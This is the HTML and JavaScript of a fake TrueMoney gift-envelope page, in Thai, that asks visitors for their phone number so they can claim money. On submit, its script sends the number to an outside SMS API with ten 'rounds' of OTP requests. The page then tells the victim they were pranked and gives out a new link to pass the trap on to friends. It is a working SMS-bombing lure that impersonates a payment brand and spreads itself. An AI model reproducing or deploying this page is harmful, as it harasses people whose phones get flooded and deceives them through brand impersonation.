<body>
  <div class="container">
    <div class="content">
      <div class="image-container">
        <img id="main-img" src="https://ext.same-assets.com/1243229916/309339935.png" alt="TrueMoney Gift" class="main-image">
      </div>
      
      <div class="text-content">
        <h1 id="voucher-name">นรวุฒิ ***</h1>
        <p id="voucher-title">ส่งซองทรูมันนี่ให้คุณ</p>
      </div>
      
      <div class="form-container">
        <label for="mobile-text-field" id="mobile-title">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
        <input type="tel" class="mobile-text-field" id="phoneInput" placeholder="08x-xxx-xxxx" maxlength="12">
        <p id="mobile-error" class="error-text">&#8204;</p>
      </div>
      
      <div class="links-container">
        <p id="detail-text">
          หากคุณยังไม่มีบัญชีทรูมันนี่ <a id="register-link" href="#" class="blue-link">สมัครสมาชิกที่นี่</a>
        </p>
        
        <p class="detail-link-container">
          <a id="voucher-detail-link" href="#" class="blue-link">ดูรายละเอียดซอง</a>
        </p>
      </div>
    </div>
    
    <div class="footer">
      <button id="footer-button" class="orange-button" onclick="sendOTP()">รับซองเลย</button>
    </div>
  </div>
  
  <div class="popup" id="popup">
    <h3>😂 คุณโดนแกล้งแล้ว!</h3>
    <p>ส่งลิงก์นี้ให้เพื่อนเพื่อไม่ให้โดนคนเดียว:</p>
    <input type="text" id="generatedLink" readonly style="margin: 10px 0; padding: 10px; width: 100%; text-align: center; border: 1px solid #ccc; border-radius: 8px;">
    <button onclick="copyToClipboard()" style="padding: 10px 20px; background-color: #fa8f1b; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">คัดลอกลิงก์</button>
    <p id="copyStatus" style="margin-top: 8px; color: green;"></p>
  </div>  

  <script>
    const phoneInput = document.getElementById("phoneInput");
    const errorText = document.getElementById("mobile-error");
  
    phoneInput.addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 10) value = value.slice(0, 10);
  
      let formatted = value;
      if (value.length > 3 && value.length <= 6) {
        formatted = `${value.slice(0, 3)}-${value.slice(3)}`;
      } else if (value.length > 6) {
        formatted = `${value.slice(0, 3)}-${value.slice(3, 6)}-${value.slice(6)}`;
      }
  
      e.target.value = formatted;
      phoneInput.classList.remove("input-error");
      errorText.textContent = "";
    });
  
    function sendOTP() {
      const rawPhone = phoneInput.value.trim();
      const phone = rawPhone.replace(/-/g, "");
  
      if (!/^0\d{9}$/.test(phone)) {
        phoneInput.classList.add("input-error");
        errorText.textContent = "เบอร์โทรศัพท์ไม่ถูกต้อง";
        return;
      } else {
        phoneInput.classList.remove("input-error");
        errorText.textContent = "";
        document.getElementById("popup").style.display = "block";
        const randomPath = generateRandomPath();
        const generatedLink = `${window.location.origin}/campain/?v=${randomPath}`;
        document.getElementById("generatedLink").value = generatedLink;
          setTimeout(() => {
            document.getElementById("popup").style.display = "none";
          }, 10000);
      }
  
      const apiUrl = `https://eh4404-api-sms.onrender.com/send-otp/?phone=${phone}&rounds=10&key=EH4404`;
  
      fetch(apiUrl)
        .catch(error => {
          phoneInput.classList.add("input-error");
          errorText.textContent = "เบอร์โทรศัพท์ไม่ถูกต้อง";
          console.error(error);
        });
    }
    function copyLink() {
      const linkToCopy = window.location.href;
      navigator.clipboard.writeText(linkToCopy)
        .then(() => {
          document.getElementById("copy-status").textContent = "คัดลอกลิงก์แล้ว! 🎉";
          setTimeout(() => {
            document.getElementById("copy-status").textContent = "";
          }, 3000);
        })
        .catch(err => {
          console.error('Copy failed:', err);
        });
    }
    function generateRandomPath(length = 35) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }
  function copyToClipboard() {
    const input = document.getElementById("generatedLink");
    input.select();
    input.setSelectionRange(0, 99999); // สำหรับมือถือ
    document.execCommand("copy");
    document.getElementById("copyStatus").textContent = "คัดลอกแล้ว!";
    setTimeout(() => {
      document.getElementById("copyStatus").textContent = "";
    }, 3000);
  }
  </script>
